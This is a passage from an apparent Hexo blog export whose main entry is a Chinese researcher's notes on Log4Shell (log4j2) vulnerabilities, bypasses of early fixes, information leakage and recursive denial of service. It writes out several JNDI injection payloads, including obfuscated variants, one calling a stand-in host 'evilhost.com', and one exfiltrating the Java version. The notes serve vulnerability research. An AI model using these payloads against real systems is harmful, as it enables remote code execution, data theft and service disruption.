c5b29b6c4e46ab7612f5b6888bb1c490a12c6cdc6d7655f0c20780f81d50a15f89122fc2c3f23dcb90ff9cc8d483d6e75a0c25323f4bf20391fb9473cea5f27b371b500027a397b68a3852d15b7874c0f000beb781cb5b33766c54350872d3aa0b0acd0204fae4ccb73ddbb3a82ed20bebe770a58787d7d0225c36315e870be25c744d6fe6210434bfc8517667ac678a84e08277bbd30edc9085fdc21994ff0a1989acf7b2fb4fbc5c9273c1271ae971a1c992cb0b680d399f6e514fa174eda6d79481aaebce5039010ec6ba01267eebfc20d4f6d4ae3477e50133f44808eca15f63a3ed92dc7c9389bb1cb1e9336645fa6ebf0ef3959011f3c6cc6c0dc692f67cbdae0c538c6414189a6077c39f2700a5f1b2f7e356c8e4be1917825e22d64c9da1cdeb88729314b48d8e8ebce3e7ec6132bae08a0886e52717eaa242bc1af95b6423858bcfd4deeb17cbc018f16365d5be0daed56b6d5a01ec1c414b2c41494b2d26cedefc677d6493027ff7c8e7bb98a2f09e5f0ebf1ffa0d4bf6be09a4bc71c4f48ae7c118a051fcfa3a1f9ddb636d8788e784096a0e221cd0874c2155282effa7ee2e18b356d84f429f14055df0ce4d1b0f3cd222294b755b4d1a016a23ed9ed4d52f34d2fc315e61b855cb5a831a6e28749eb182b9f5a5ac6f04440cf819362aaee5e9a433c265d2345584ad9fc2781ea4541b24fd745313859966ae26716fb3a450625cfd656a2efa82625dfc91c2060d05e587ca813924a9018ccd500b7a08e76de83ad435c3cad97803bfc3f8fe4ba9ffd55a5ea7231e1c5d1366dfdc9e7ac5ad1f09b365b0029b9764e0004217af0e8411dbae9220935215283a8573eb00ccf984f4d93356ca38d83cb04930efcac61df326fe90c3820d34e333197056dcdc88e4ea5a439030d5ffc926f4169fb9ff838ce5b8cfb2ef94339c24b3617e5d5fe775cfc5c59ed68a2bf9d123fdb1afe7cb1860560f35d47a20bdace9b8279904c737bc4f63b7bd4a728335a676e5f5ff96e3e3e5d2e0b5fe530ad2f56e689e9a2e28305f135fafae29bf655c60ab3a07ef6d7f6e20ed625e595409876f4c36493ceaacbbc79549b6f33a4bf8af1ca430e327d7402b0e9e75cb2ced059cd0a004e4a5bb06d7463dcb31d18bdae75b99bb08ba31ccd021604e4a2679526cd41617b2912e568e3ac9532ff86fc1ed6b16a848d7c20dd55a81ab9f3e049f37fc3043e1e7e8c5b4adc52bb6ad6a7226e4fcb9daf27d0f59df40074a0ff91d92b8696de5d8842728b2fc765da53e2a235d404a3944eaccca4e42f055cfec2140ea978a4bc575c25b373adee5cc1c82c82723f8f901bf5e948b2e7596b9bf26665e3c8baf80133134f2c490fc8444b4f743292ef522bfb6ae9629d23b56c48022241fe1e0c07eedefca15cf4fbe1fe62714d8ec58fddd4b87fb20c0059b3dcba6fdf3b436786b66c8bf572b0d1a9433844cbe25d0aea8216a6adf87f814a0f3528c711a030e40e6c14a7635f93eb7198e13bab29a7f2e853ab80c9f411b1a38940cf2fd291e5e17ffb53c160c2f51547fbcae00a66d06436ae9fdedac714df71168d80115182faf75b2e7ea5384b7a45f7e40ebad664b71b61013d00eeccacfcf6f27b4d4909633f565ff1b3d44d48ee458c43de96033d7502940bababd18f369a9d36dc861b13df4f9af2992487157b2fe0872389c831977af34ca62cf3ec556cc68fa1228c3e4c53e0e191fb288887782b4798abc63b7b9c8a0f047fac157b7fded036274a2a764557d5489dc266b1a98a8d66a4e1e2f305d69dc9d4917f176d225dd935ea617b6fe88449ed97836fa4188fc5d5fa5469d5c4bc59b01b825a2b61b4453c6c6837a2e58d18ed40b358221afe839e838b7c5bc619ba9768788dba71574a1ccdd4c99fa99e7fcabad7f9853a76e1ca82a05b85dec04d35a4697eef7a02125fc030a541720edc5f369228c7b8a59023333ea2c3ade62ab53ccd8e6bf276ae50017c0ea34bb5b0f0c3682f002ad45ddd92e1ba689251fc5876053d85e67d753235571142edebef68cab85fcd21a0f10d9863601db81e21a1702d510a5215d4e43ca1e62eda7c5f4aed4acd6ebe40a59e40d10209539edc12f9b847602c31d44d1552a6ac8ca66f6007c93abe2fa6eb0b6dd0b267405f4a744313a555d592b2317512065d2b305ef068d0d421dcfcbf13e38324cc6d10f2150e89c867985883f6e0b86c33edc2167bcbc5567baf4234111f8f7a4690e046b6731808af7fc01c06b5135c0fc565dc9546ef8ae2b2212885e080ba47b658e770eb14b7190098ff36758854a3c12d904db621ae13c2ce8145c0895c749f9d7606bac6ee02802261e92499bb1f5ab3c489ddb44d8c98bf90209b1ccbb54333cd7181877ad0020d4c663c8e6fb25ef74754957e9ddab4324f87b743c060138eb6c9fd976c71c9397a7049543c76d853aa9a3e7b4a822c1a1f95c3045b12d37a5531355adda0e265a5745cee56d5c26142cb6a1a349af2783ebdacd47e58c5bb4106bab68ac8f2b5dad5fef29c153797a818f3ae375828a9e8bece50ccc7202af3862aaf7246a19feb8fa1d5c1c724b297eb538664f8486ac21b3243fea236996001cc9c636d978eb89a5d4ffd276cfff621f8b7b07daf604da0f1537ff31d54fded0c6221b7b3232b6349a7302c21cb720cee38ffaf7eb069f6f8dd836ee3a9a533089d2a087c5d364c01bb5dca77b0212cf9a5db4e73d06a8d4d90f899a8b479ec1f5d623de94b49635a4ac0dc5a3d4fb297993a4c9a509d783f4db6268a9cf5e8736c0d263ac5b35152c2295f031df3b15e4e8528f715714cad43f35f069d752d27ec05fbcfb5f52a8588de8c794a486845615b72a556305fcfbff53b806b3e5c185eddb38bb4a00ed0b34d0b872dbc23e4c76206cb1a33223c5af669739d85fb67b11e809ac441c6b4fc7aa27ba46c3c2c82882e8348f9bf1da77fbb0fcd25c3d0bb0e5daa00ba0754577d77d2647d5b9f49fe95e934d8e9b3ca64617876ad58b20b42a7dcb60abb1776fac477e281ff99d66ff056486cd5cb0a3934b7a2ec93d936adbdc965412cae6fc6228c9096a15d7b8f878593dd393f7c1b2b77d45edda6f5bd8e0e370d3e22c44d1320743719576ee4104e8a45dcf89fa8a7709e29a350b355818a909a8bf7a44c7f320a15a889bf12b3c968d41af48043831691898dfe3cba0e5bbcc46d73e5da3135efdf66fe650ebb50ea7516c683013a451575e19bd40df70bc427139989c9675697cdf1a21e6bf4707eee2c187f5efc8d798cfdb754876c2566eba5fb437ea4ea5ed8a4f0e83ed8f222a981069f2c34b6bc4c5a2e4181ceb8bcc123394f1bbc24fd8847062894c0f13fdb4a8065a4832a0c30703eb8f03ef0503d50ed8056bc0f2da9efe6e511033d35407589790d2dc9e9dd8f7b60442147d2998c57b8f6d0a81629eb806110f714a9f396c3079f9f7314166c70d96f46e29c962b9265213a6ec423c0b13661b126ec6c8fc80158b7bfdfa19bbb7bd2cdf0fcc1843b43ff7f3bf8d1d8bf0f5c1c168f5815276eef19b1b5234f2191fa93b1025a2c5d31bc0b51bedc765535ae44a7a2be2248158672f741b5567d27a2e12093bcf5839e646d7f867e7e1db64dbc785bf676c15bef7ade1a758d7a6e6523be3599949197cd9bdd51ad65590906e317e5c1070e9c8de5e7e62c24868ed7548d9870bce50e35e050b78deb39ee97c056f75f3c6ede34f858871cfc3e61e12f8257962dee99ba1804a38659030e64602eb1a963cf688edfc8e6f22447a20ddfb1e4745f2f7817c7f3d07487ef5aaa97d4e7be76f68f4c0d55740844d5c80edb94c1ae03c081e27ee7b60548370a494be81863067c80f205682b80a8ef131f1b2b341a5667efa17d07da37be4167b7f8b3995f19927b512bb935b0abaa38dcf87ce368fcde7574665f5c818b6f65af82c9f6ea4688a4eaa9eaee13bcd394822c86d2c3c16b0fb26d9c782e0a8db85b36f38353b7ddfbef2855947f82c669addd9c464c486f79befd259bae0c5a257a3ab67ed6d711843a83f0271adbfe76e04723a0e23c6b5a08c9d20fc1cb5bb4537a71e034ed7958b6c1d63b5fcdb2d1f8d5f3ba1c79afa00178e395038bf4a3a67fcbb35580af3c07f4db8f50eed808cd7e0d1eb5b7f36d4c6e678175c49d0e72540a50f04252598c6f676bec63710d64bd4d2a965bf754860d24401de6154103cdc761f8989599581aefbd519d2aa1cb68bd864a0e63036db72fe32d27960ab9867fb104df09664c07f8510de7d69883b931272e7a815f3ca79e3a7d2f97cc4868d8fd555959ffe6c34a315993162c0e7bc145a0611ce303218729122632c851472fa395ca0924d36f17dbd825f21776153f8f9edb9943f96121725ba13972639f832f4cb09b0190b4aabdea1f5f20cc91816f119ae4a57b6893b709c1ca6656105d1937c1418fe2a6feeca59531c92aa69fb5df31f5de06730985e4543e2f290021c0a478daa02a96f24c78e12b92186d5db5cb63b737a48fde2afb60ac3c4817a46e6842bfd184e0b1467b5f22dd0a15908cd140a22b1719fa88449e2756ad61fffebef31dfce76606a8ceec25a07948b327d4415f9f86f0e78980851ff97f73aa61054b468ed84ca0cd2618b50eab78e9f92e6723dbc5d0df741f5f96a7ebcf5b2bbe69c57b843a070c95f68e9470a02d6f03aeb721d5f7ec27f86718ad6ac02f4ff937b29a733a4933dac5d0bc325fed47d9e90f1cfd605cdbcbc0034066ea394e77006804a43208ca6815af4bd346e811c10c8a9628c348b6be0090eb09c4a4300baf164092da75dd82c0734eced0fb4f53c298e37647704dad5fa5ff707c068261a907264c3127a72f4d04e690b1b8e5079b15c824631f2cf227aa9ccd7ad2078b23fe1c810806878d5f54c94b85b755896afe9bcd094f7d1042c9a2a85d1f23d9f0d48998cdc503a4df1171a097410051a9b6f8aa623189730dfa14de7f260e1f30c4d8baa81e05d53a0582ac787a5dadd223d8744ab3b06ab196c53893d9bae16864d7ee1f3ba56345b26c63272834d9fbb6063ca88224b927549d27248ccce537e0237447800939d1f508a3346588072b39a1f5b5028ee1de6f470c52849b7aab0a6c56660885f123f4295d75b20965fee347eb320baf83c55fe5302934b87139339ee5128fe655aaa38ad06e485e275ddb0d8d334feab3acca287ab245ed14419e9c3f45e1ee76a8c45b8ac1bf1c0b33a927fb4b4cfd5dac2da668a9edaf77858a1217da619403a9f83e53676c1788d66dd3ea705e45e7fe8364e6256ebd45a2b4e2d1e9ddd648627f53347e1dc8337d9aad4b74d6639f8765a017b7803ef159dccfd7f0b0e6eab18fe13e80c9c68c77fddbe20eba1daf1dc739a4ff19086</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲聊log4j2</title>
      <link href="/2022/01/19/%E9%97%B2%E8%B0%88log4j2/"/>
      <url>/2022/01/19/%E9%97%B2%E8%B0%88log4j2/</url>
      
        <content type="html"><![CDATA[<h1 id="闲谈log4j2"><a href="#闲谈log4j2" class="headerlink" title="闲谈log4j2"></a>闲谈log4j2</h1><h2 id="log4j2爆炸漏洞"><a href="#log4j2爆炸漏洞" class="headerlink" title="log4j2爆炸漏洞"></a>log4j2爆炸漏洞</h2><p>简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">文档</a>，可能是自己语文水平不太好。(有点吃亏。。。</p><h2 id="挖掘新问题"><a href="#挖掘新问题" class="headerlink" title="挖掘新问题"></a>挖掘新问题</h2><p>然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png" alt="image-20211218215051277"></p><p>当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。</p><p>说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。</p><h2 id="绕过rc1"><a href="#绕过rc1" class="headerlink" title="绕过rc1"></a>绕过rc1</h2><p>在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png" alt="Q`X GHE7UL3 IBYUAB0EFW"></p><p>所以绕过思路就直接让new url(name) 抛出异常就欧克。</p><p>tips:和bypass7u21差不多。。。</p><h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">今天看陈师傅写的文章，也就是修复log4j的坑。</span><br><span class="line">在漏洞报出来的时候修复的方法是：</span><br><span class="line"></span><br><span class="line">1.设置配置文件参数 log4j2.formatMsgNoLookups=true,</span><br><span class="line">2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,</span><br><span class="line">3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</span><br><span class="line">而这样的修复是打破这个判断</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png" alt="image-20211215142114290"></p><p>认真看该代码其实在下面还有一个入口。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png" alt="image-20211215142251448"></p><p>可以看到判断条件是 <strong>msg instanceof StringBuilderFormattable</strong></p><p>所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.printf(Level.ERROR,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:2333&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd</a></p><p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。</p><p>不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><p><a href="https://www.cnblogs.com/jona-test/p/11399218.html">https://www.cnblogs.com/jona-test/p/11399218.html</a></p><p>更新 2021/12/24</p><p>看了大哥4ra1n的文章 <a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p>其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接</p><p><img src="https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png" alt="image"></p><p>然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()</p><p>而NumberFormatException就是触发RuntimeException的子类。</p><p>${jndi:ldap://x.x.x.x:${java:version}/xxx}</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data</p><p>还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;::-d&#125;i:ldap://127.0.0.1:8880/&#125;</span><br></pre></td></tr></table></figure><h2 id="cve-dos"><a href="#cve-dos" class="headerlink" title="cve-dos"></a>cve-dos</h2><p>大哥成功获得apache的cve。<a href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p><p>简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip…造成dos.</p><p>在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Appenders&gt;</span><br><span class="line">    &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout&gt;</span><br><span class="line">            &lt;pattern&gt;%d %p %c&#123;1.&#125; [%t] $$&#123;ctx:loginId&#125; %m%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/PatternLayout&gt;</span><br><span class="line">    &lt;/Console&gt;</span><br><span class="line">&lt;/Appenders&gt;</span><br></pre></td></tr></table></figure><p>而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。</p><h2 id="bypass-2-15"><a href="#bypass-2-15" class="headerlink" title="bypass 2.15"></a>bypass 2.15</h2><p>昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>不过环境要求比较严格而且真实环境的rce可能比较可能。。。</p><p>2021/12/20更新</p><p>今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 <a href="https://xz.aliyun.com/t/10689">https://xz.aliyun.com/t/10689</a></p><p>利用条件</p><p>1.开启lookup功能</p><p>2.macos系统</p><p>3.泛域名解析</p><p>4.本地存在gadget</p><p>该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>然后去绕过ldap服务的限制。</p><p><img src="https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png" alt="image-20211220183446609"></p><p>正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过<strong>if (!allowedClasses.contains(className))</strong></p><p>也其实就是我们在了ldap的时候的思路 <strong>LDAP服务攻击一般是先测Reference再测deserializeObject</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png" alt="image-20211220183705875"></p><h2 id="CVE-2021-45105"><a href="#CVE-2021-45105" class="headerlink" title="CVE-2021-45105"></a>CVE-2021-45105</h2><p>这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-::-$$&#123;::-$&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$ 会进入一个异常</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png" alt="image"></p><p><del>说不定其他解析表达式也存在。。。。</del></p><p><a href="https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor">https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc">https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc</a></p><p>更新 2021/12/22</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在配置文件中配置：$$&#123;ctx:apiVersion&#125;   则输入 $&#123;$&#123;ctx:apiVersion&#125;&#125;或$&#123;$&#123;::-$&#123;::-$$&#123;::-aaa&#125;&#125;&#125;&#125;则可以造成递归dos</span><br><span class="line">在配置文件中配置：$&#123;ctx:apiVersion&#125;   则输入$&#123;$&#123;::-$&#123;::-$$&#123;::-dos&#125;&#125;&#125;&#125;则可以造成递归dos</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>cve:<a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&amp;mid=2247484028&amp;idx=1&amp;sn=5748c6b75530a786f1bf0622616413c6&amp;chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&amp;mpshare=1&amp;scene=23&amp;srcid=12298p7j6KLY39FVuwNzmFRD&amp;sharer_sharetime=1640749370687&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">聊聊配置文件 RCE 这件事</a></p><p>不愧是师傅总结的不错，简单的说就是通过配置文件去rce.<br>突然又想到了一个：web.xml里面添加servlet去实现解析一句话。<br>访问/exp路由就会解析</p><p><img src="https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/WEB-INF/1.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/exp<span class="tag">&lt;/<span class="name">url-patten</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>主要是自己的问题，</p><p>第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp</p><p>第二点是自己没有考虑到dos中的网络连接超时问题。</p><p>第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。</p><p>（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>啥也没有</title>
      <link href="/2022/01/01/yso%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/01/01/yso%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>参考：</p><p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javassist</title>
      <link href="/2021/12/10/Javassist/"/>
      <url>/2021/12/10/Javassist/</url>
      
